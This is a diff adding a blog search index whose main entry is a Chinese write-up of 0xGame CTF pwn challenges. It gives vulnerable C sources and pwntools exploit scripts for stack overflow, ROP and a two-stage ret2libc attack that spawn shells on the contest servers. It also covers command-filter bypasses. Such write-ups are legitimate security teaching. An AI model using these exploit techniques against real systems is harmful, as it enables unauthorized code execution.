@@ -1,0 +1,201 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>0xgame比赛复现学习（pwn）（更新中）</title>
+    <url>/2025/10/24/0xgame%E9%9B%86%E9%94%A6%EF%BC%88%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89-pwn/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="简单数学题"><a href="#简单数学题" class="headerlink" title="简单数学题"></a>简单数学题</h3><p>题目</p>
+<p>01的高数挂了 <em>QwQ</em>他被罚完成1000道数学题你能帮帮他吗</p>
+<p>附件源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\#include &lt;stdio.h&gt; </span><br><span class="line"></span><br><span class="line">\#include &lt;stdlib.h&gt; </span><br><span class="line"></span><br><span class="line">\#include &lt;string.h&gt; </span><br><span class="line"></span><br><span class="line">\#include &lt;unistd.h&gt; </span><br><span class="line"></span><br><span class="line">\#include &lt;fcntl.h&gt; </span><br><span class="line"></span><br><span class="line">\#include &lt;sys/types.h&gt; </span><br><span class="line"></span><br><span class="line">\#include &lt;sys/ioctl.h&gt; </span><br><span class="line"></span><br><span class="line">void* buf; </span><br><span class="line"></span><br><span class="line">void init() </span><br><span class="line"></span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line">setvbuf(stdin, 0); </span><br><span class="line"></span><br><span class="line">setvbuf(stdout, 0); </span><br><span class="line"></span><br><span class="line">setvbuf(stderr, 0); </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">int get(int n,int m,int sym) </span><br><span class="line"></span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line">memset(buf,0,0x100); </span><br><span class="line"></span><br><span class="line">switch(sym) </span><br><span class="line"></span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line">case 0: </span><br><span class="line"></span><br><span class="line">sprintf(buf,&quot;%d %s %d = ?\n&quot;,n,&quot;+&quot;,m); </span><br><span class="line"></span><br><span class="line">return n+m; </span><br><span class="line"></span><br><span class="line">case 1: </span><br><span class="line"></span><br><span class="line">sprintf(buf,&quot;%d %s %d = ?\n&quot;,n,&quot;-&quot;,m); </span><br><span class="line"></span><br><span class="line">return n-m; </span><br><span class="line"></span><br><span class="line">case 2: </span><br><span class="line"></span><br><span class="line">sprintf(buf,&quot;%d %s %d = ?\n&quot;,n,&quot;x&quot;,m); </span><br><span class="line"></span><br><span class="line">return n*m; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">int main() </span><br><span class="line"></span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line">init(); </span><br><span class="line"></span><br><span class="line">buf=(void *)malloc(0x100); </span><br><span class="line"></span><br><span class="line">srand(time(0)); </span><br><span class="line"></span><br><span class="line">int n,m,num,sym; </span><br><span class="line"></span><br><span class="line">puts(&quot;Are you good at math?&quot;); </span><br><span class="line"></span><br><span class="line">puts(&quot;Kore wa shiren da!&quot;); </span><br><span class="line"></span><br><span class="line">for(int i=0;i&lt;1000;i++) </span><br><span class="line"></span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line">n=rand()%1000; </span><br><span class="line"></span><br><span class="line">m=rand()%1000; </span><br><span class="line"></span><br><span class="line">sym=rand()%3; </span><br><span class="line"></span><br><span class="line">int ret=get(n,m,sym); </span><br><span class="line"></span><br><span class="line">printf(buf); </span><br><span class="line"></span><br><span class="line">scanf(&quot;%d&quot;,&amp;num); </span><br><span class="line"></span><br><span class="line">if(num!=ret) </span><br><span class="line"></span><br><span class="line">exit(0); </span><br><span class="line"></span><br><span class="line">puts(&quot;Good work!&quot;); </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">puts(&quot;Congratulations on completing the challenge&quot;); </span><br><span class="line"></span><br><span class="line">system(&quot;/bin/sh&quot;); </span><br><span class="line"></span><br><span class="line">return 0; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//1.png" alt="1"></p>
+<p>根据题目要求需要进行上千次解题才能得到flag</p>
+<p>分析源码发现他通过<code>srand(time(0))</code>随机初始计算值，随着mn值的不同进行对应的循环运算，最终无法人为进行运算</p>
+<p>通过ai分析解出exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">io=remote(&quot;nc1.ctfplus.cn&quot;,22605)</span><br><span class="line">io.recvuntil(b&quot;Kore wa shiren da!\n&quot;)</span><br><span class="line">for i in range(1000):</span><br><span class="line">t=io.recvuntil(b&quot;?&quot;)[:-3]</span><br><span class="line">if b&quot;x&quot; in t:</span><br><span class="line">t=t.decode()</span><br><span class="line">t = t.replace(&quot;x&quot;, &quot;*&quot;, 1)</span><br><span class="line">t=t.encode()</span><br><span class="line">num=eval(t)</span><br><span class="line">io.sendline(str(num).encode())</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>经过一段时间计算得到了shell得到flag0xGame{7h3_m4573r_0f_m47h!!!}</p>
+<p><img src="/.io//image.png" alt="image"></p>
+<h2 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack overflow"></a>stack overflow</h2><p>最最最简单的栈溢出玩的开心 <em>:)</em></p>
+<p><img src="/.io//image2.png" alt="image2"></p>
+<p>用checksec分析得到附件64位</p>
+<p>ida分析<img src="/.io//image3.png" alt="image3"></p>
+<p>官方源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line">#include &lt;string.h&gt; </span><br><span class="line">#include &lt;unistd.h&gt; </span><br><span class="line">#include &lt;fcntl.h&gt; </span><br><span class="line">#include &lt;sys/types.h&gt; </span><br><span class="line">#include &lt;sys/ioctl.h&gt; </span><br><span class="line">void backdoor() </span><br><span class="line">&#123; </span><br><span class="line">system(&quot;echo \&quot;Isn&#x27;t here...\&quot;&quot;); </span><br><span class="line">exit(0); </span><br><span class="line">&#125; </span><br><span class="line">void whhhat() </span><br><span class="line">&#123; </span><br><span class="line">printf(&quot;good work!\n&quot;); </span><br><span class="line">execve(&quot;/bin/sh&quot;,0,0); </span><br><span class="line">&#125; </span><br><span class="line">int main() </span><br><span class="line">&#123; </span><br><span class="line">setvbuf(stdout, NULL, _IONBF, 0); </span><br><span class="line">setvbuf(stdin, NULL, _IONBF, 0); </span><br><span class="line">setvbuf(stderr, NULL, _IONBF, 0); </span><br><span class="line">char ss[0x30]; </span><br><span class="line">puts(&quot;Just say something...&quot;); </span><br><span class="line">read(0,ss,0x100); </span><br><span class="line">return 0; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>用ida分析源码得到返回目标函数为whhat内部存在execve函数调用系统程序获取shell<img src="/.io//image4.png" alt="image4"></p>
+<p><img src="/.io//image5.png" alt="image5"></p>
+<p>根据提示得到栈溢出，注意到数组ss长度为30个字节，但是read函数读取了100个字节，因此我们可以构造payload&#x3D;b’a*38+p64（目标函数地址）</p>
+<p>填充为什么是38字节是因为目标程序为64位，每个寄存器占八位，要覆盖到目标地址就必须把缓冲区之后的指针rsp一起覆盖所以是38字节</p>
+<p>根据ida分析得到目标地址为0x4011F7 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=remote(&quot;nc1.ctfplus.cn&quot;,17151)</span><br><span class="line">#io=process(&#x27;./pwn&#x27;)</span><br><span class="line">payload=b&#x27;a&#x27;*0x38+p64(0x4011F7)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag&#x3D;0xGame{W0w_y0u_kn0w_h0w_t0_h1j@ck_3x3cut10n_fl0w}</p>
+<p><img src="/.io//image6.png" alt="image6"></p>
+<h2 id="命令执行🤔"><a href="#命令执行🤔" class="headerlink" title="命令执行🤔"></a>命令执行🤔</h2><p>01送了你一个rce,但过滤了sh和cat你有什么办法获取flag吗</p>
+<p>根据题目提示我们获取flag时不用sh和cat</p>
+<p><img src="/.io//image7.png" alt="image7"></p>
+<p>用ai生成绕过指令尝试了几次后发现.txt纯多余</p>
+<p><img src="/.io//image8.png" alt="image8"></p>
+<p>0xGame{y0u_c4n_4ls0_3x3cu73_c0mm4nd_w17h0u7_5h_4nd_c47}</p>
+<h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>必玩项目</p>
+<p>直接nc上去cat就行</p>
+<p><img src="/.io//image9.png" alt="image9"></p>
+<h2 id="rop1"><a href="#rop1" class="headerlink" title="rop1"></a>rop1</h2><p>ROP1</p>
+<p>什么是ROP🤔?你在之前已经学会如何控制执行流到目标地址了现在01将system与参数分离你还能rce吗</p>
+<p>根据题目提示可以推断system函数与&#x2F;bin&#x2F;sh分离</p>
+<p>查看程序位数为64位</p>
+<p><img src="/.io//image10.png" alt="image10"></p>
+<p>ida反编译可以找到调用system函数地址为0x401195</p>
+<p><img src="/.io//image11.png" alt="image11"></p>
+<p><img src="/.io//image12.png" alt="image12"></p>
+<p>在ida中没有找到直接的sh但是发现了提供的字符串echo maybe。。。。</p>
+<p>通过计算可以知道sh从0x402004中开始计算地址从0x40201e</p>
+<p><img src="/.io//image13.png" alt="image13"></p>
+<p>payload构造手法&#x3D;b’a*(0x20+0x08)+rdi_adress+sh_add+system_add</p>
+<p>先放参数后放地址的原因：</p>
+<ul>
+<li><strong>x86-64调用约定</strong>：参数通过寄存器传递（rdi存放第一个参数）</li>
+</ul>
+<p>通过rdi作为命令载体，system是函数，sh是函数参数执行system（“&#x2F;bin&#x2F;sh”）</p>
+<p><img src="/.io//image14.png" alt="image14"></p>
+<p><img src="/.io//image15.png" alt="image15"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./pwn&#x27;)</span><br><span class="line">io=remote(&quot;127.0.0.1&quot;,2223)</span><br><span class="line">system=p64(0x401195)</span><br><span class="line">sh=p64(0x000000000040201e)</span><br><span class="line">rdi=p64(0x000000000040117e)</span><br><span class="line">payload=b&#x27;a&#x27;*0x28+rdi+sh+system</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="rop2"><a href="#rop2" class="headerlink" title="rop2"></a>rop2</h2><p>看来你已经知道怎么控制参数除了sh,在unix&#x2F;linux中还有一个神奇的参数也能达到rce的效果你能找到它吗?</p>
+<p>先用checksec看位数</p>
+<p><img src="/.io//image16.png" alt="img"></p>
+<p>可以了解到溢出位是48加8&#x3D;56字节</p>
+<p>rdi地址为0x40119e</p>
+<p><img src="/.io//image17.png" alt="image17"></p>
+<p><img src="/.io//image18.png" alt="image18"></p>
+<p>题目中暗示的神秘参数经过ai分析可以知道是￥ifs</p>
+<p><img src="/.io//image19.png" alt="image19"></p>
+<p><img src="/.io//image20.png" alt="image20"></p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+<th>利用价值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$0</code></td>
+<td>当前程序名</td>
+<td>★★★★★ (SUID提权)</td>
+</tr>
+<tr>
+<td><code>$@</code></td>
+<td>所有参数</td>
+<td>★★★☆☆ (可能用于参数注入)</td>
+</tr>
+<tr>
+<td><code>$*</code></td>
+<td>所有参数(作为一个单词)</td>
+<td>★★★☆☆ (可能用于参数注入)</td>
+</tr>
+<tr>
+<td><code>$$</code></td>
+<td>当前shell的PID</td>
+<td>★★☆☆☆ (有限利用)</td>
+</tr>
+<tr>
+<td><code>$!</code></td>
+<td>最后后台进程的PID</td>
+<td>★★☆☆☆ (有限利用)</td>
+</tr>
+</tbody></table>
+<p>使用gdb搜索￥0</p>
+<p><img src="/.io//image21.png" alt="image21"></p>
+<p>payload构造&#x3D;b’a’*0x38+rdi_add+$0_add+sys_add</p>
+<p>这里￥0的作用是获取终端等同于&#x2F;bin&#x2F;sh的作用，</p>
+<p>from pwn import *</p>
+<p>#io&#x3D;process(‘.&#x2F;pwn’)</p>
+<p>io&#x3D;remote(“nc1.ctfplus.cn”,43728)</p>
+<p>payload&#x3D;b’a’*0x38+p64(0x40119E)+p64(0x401200+2)+p64(0x40122B)</p>
+<p>#gdb.attach(io)</p>
+<p>io.sendline(payload)</p>
+<p>io.interactive()</p>
+<p><img src="/.io//image22.png" alt="image22"></p>
+<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>题目中给出了libc连接器和libc库</p>
+<p>通过touchelf –set-interperter ld-linux-x86-64.so.6 .&#x2F;pwn</p>
+<p>更改pwn文件的libc链接器，保持libc库文件和连接器在同一目录</p>
+<p>用checksec发现文件为64位</p>
+<p>在ida中可知缓冲区64位，溢出需要的字节数就是64＋8&#x3D;72</p>
+<p><img src="/.io//image23.png" alt="image23"></p>
+<p>通过cyclic验证一遍通过观察程序崩溃时rsp的值，由于rsp储存八个字节所以只需要前八个字母jaaaaaaa，通过cyclic -l jaaaaaaa获取偏移量验证是72字节</p>
+<p><img src="/.io//image24.png" alt="image24"></p>
+<p>要找到可利用的函数system等可通过libc函数计算偏移量</p>
+<p>第一步要泄露libc的基地址</p>
+<p>ROPgadget –binary pwn | grep “pop rdi”</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -d pwn | grep -E &quot;&lt;vuln&gt;|&lt;main&gt;&quot;</span><br><span class="line">objdump -d pwn | grep -E &quot;puts@plt|read@plt&quot;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以得到rdi地址是0x40119e，vuln地址是0x4011ea</p>
+<p>main函数地址是0x40112d，puts_plt &#x3D; 0x401074</p>
+<p>puts_got &#x3D; 0x404018</p>
+<p><img src="/.io//image25.png" alt="image25"></p>
+<p>泄露libc地址的payload构造结构</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1 = b&#x27;A&#x27; * 72  # 64字节buf + 8字节rbp</span><br><span class="line">payload1 += p64(pop_rdi)</span><br><span class="line">payload1 += p64(puts_got)</span><br><span class="line">payload1 += p64(puts_plt)</span><br><span class="line">payload1 += p64(vuln_addr)</span><br></pre></td></tr></table></figure>
+
+<p>payload泄露的原理是通过put函数读取plt表中libc的地址</p>
+<p>在我们填充72字节溢出后栈的结构</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[低地址]</span><br><span class="line">AAAAAAAA... (72 bytes)   &lt;- 缓冲区填充</span><br><span class="line">pop_rdi地址               &lt;- 覆盖的返回地址</span><br><span class="line">puts_got地址</span><br><span class="line">puts_plt地址  </span><br><span class="line">vuln_addr地址</span><br><span class="line">[高地址]</span><br></pre></td></tr></table></figure>
+
+<p>为什么返回地址要跳转到rdi：用于充当put函数参数的载体</p>
+<p>为什么要有put_got表地址，作为全局偏移量表可以通过got表寻找put函数，并且由于alsr会随机libc中地址位置所以只能通过固定不变得got获取</p>
+<p>为什么要有put_plt地址，plt地址作为过程连接表记录了程序运行时libc中函数的实际地址，是程序执行函数的入口能够找到puts函数在libc中的位置</p>
+<p>最终通过puts函数在libc的偏移量反向推导libc的真实地址</p>
+<p>第二步则是计算 libc 基址和其他函数地址</p>
+<p>已知基地址等于真实地址减去偏移量，根据题目提供的libc库文件得到该版本中libc的偏移量</p>
+<p>最后去找&#x2F;bin&#x2F;shell和system函数的地址</p>
+<p>构造攻击payload结构</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload2 = b&#x27;A&#x27; * 72</span><br><span class="line">payload2 += p64(pop_rdi)</span><br><span class="line">payload2 += p64(binsh_addr)</span><br><span class="line">payload2 += p64(system_addr)</span><br></pre></td></tr></table></figure>
+
+<p>libc函数计算公式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc_base = leaked_puts - puts_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># 设置目标程序</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line"># 启动程序</span><br><span class="line">p = remote(&#x27;nc1.ctfplus.cn&#x27;, 23370)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line"># gadgets</span><br><span class="line">pop_rdi = 0x40119E</span><br><span class="line"></span><br><span class="line"># 获取关键函数地址</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]  # 使用ELF对象获取更可靠</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">vuln_addr = elf.symbols[&#x27;vuln&#x27;]</span><br><span class="line">offset = 72</span><br><span class="line"></span><br><span class="line"># 第一次攻击：泄露libc地址</span><br><span class="line">payload1 = b&#x27;A&#x27; * offset</span><br><span class="line">payload1 += p64(pop_rdi)        # pop rdi; ret</span><br><span class="line">payload1 += p64(puts_got)       # 参数：puts在GOT中的地址</span><br><span class="line">payload1 += p64(puts_plt)       # 调用puts(puts_got)打印出puts的实际地址</span><br><span class="line">payload1 += p64(vuln_addr)      # 返回到vuln函数，进行第二次溢出</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;Input something: &quot;)</span><br><span class="line">p.sendline(payload1)  # 使用sendline确保有换行符</span><br><span class="line"></span><br><span class="line"># 接收泄露的地址</span><br><span class="line">leak_data = p.recvline()[:-1]  # 去掉换行符</span><br><span class="line">if len(leak_data) &lt; 8:</span><br><span class="line">    leak_data = leak_data.ljust(8, b&#x27;\x00&#x27;)</span><br><span class="line">leak_puts = u64(leak_data[:8].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">log.info(f&quot;泄露的puts地址: &#123;hex(leak_puts)&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 计算libc基址和其他函数地址</span><br><span class="line">libc_base = leak_puts - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">system_addr = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line"></span><br><span class="line">log.info(f&quot;libc基址: &#123;hex(libc_base)&#125;&quot;)</span><br><span class="line">log.info(f&quot;system地址: &#123;hex(system_addr)&#125;&quot;)</span><br><span class="line">log.info(f&quot;/bin/sh地址: &#123;hex(binsh_addr)&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 第二次攻击：获取shell</span><br><span class="line">payload2 = b&#x27;A&#x27; * offset</span><br><span class="line">payload2 += p64(pop_rdi)        # pop rdi; ret  </span><br><span class="line">payload2 += p64(binsh_addr)     # 参数：/bin/sh字符串地址</span><br><span class="line">payload2 += p64(system_addr)    # 调用system(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;Input something: &quot;)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line"># 获取shell</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/.io//image26.png" alt="image26"></p>
+<p>使用pwntool获取函数地址</p>
+<p>elf &#x3D; ELF(‘.&#x2F;pwn’)</p>
+<p>puts_plt &#x3D; elf.plt[‘puts’]</p>
+<p>vuln_addr &#x3D; elf.symbols[‘vuln’]</p>
+<h3 id="植物大战僵尸"><a href="#植物大战僵尸" class="headerlink" title="植物大战僵尸"></a>植物大战僵尸</h3><p>题目：01师傅学完c语言中的多线程后,兴致勃勃地想手写了个植物大战僵尸但是他写完管理界面后就懒得动了 XD在他写的demo里,管理员权限相关权鉴被他注释掉,他觉得这样就安全了</p>
+<p>先用checksec查看发现保护机制全开</p>
+<p><img src="/.io//image27.png" alt="image27"></p>
+<p>根据题目猜测利用程序中</p>
+]]></content>
+      <categories>
+        <category>安全技术</category>
+        <category>CTF比赛</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>CTF</tag>
+        <tag>二进制安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2025/10/26/hello-world/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>我的文章标题</title>
+    <url>/2025/10/24/%E6%88%91%E7%9A%84%E6%96%87%E7%AB%A0%E6%A0%87%E9%A2%98/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
+  </entry>
+</search>
